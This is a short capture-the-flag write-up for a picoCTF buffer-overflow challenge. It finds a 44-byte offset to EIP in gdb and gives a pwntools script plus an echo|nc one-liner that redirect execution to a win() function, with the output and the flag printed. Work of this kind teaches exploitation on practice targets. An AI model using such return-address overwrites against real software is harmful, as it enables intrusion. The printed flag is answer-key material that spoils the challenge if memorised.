- This is a simple challenge where we need to make sure the win function gets called

- We see that win() prints the flag but isn’t being called in main or any other place.  We can call the function by passing in the address(with offset) via gets when vuln() is called by main, this ensures that the win function gets called.

- So now we need to find the offset of the buffer. We open debug using gdb. We generate a pattern of length 200, and input it as string and then we see that on overflow it returns an address `0x6161616c`,pattern laaa i.e, eip

- Now we need to enter offset of 44 letters and then address of win function in order to overwrite
- do info functions and get the address of win - We see win is at `0x080491f6`
- note that it is little endian

here is the python script
```python
from pwn import *
p = remote("saturn.picoctf.net",53482)
payload = b"A"*44+p32(0x80491f6)
p.sendline(payload)
p.interactive()
```

on running this
```bash
[+] Opening connection to saturn.picoctf.net on port 53482: Done
[*] Switching to interactive mode
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_b15b081e}[*] Got EOF while reading in interactive
```

Or run this command
```bash
$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08" | nc saturn.picoctf.net 53482
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_b15b081e}   
```

**FLAG - `picoCTF{addr3ss3s_ar3_3asy_b15b081e}`**
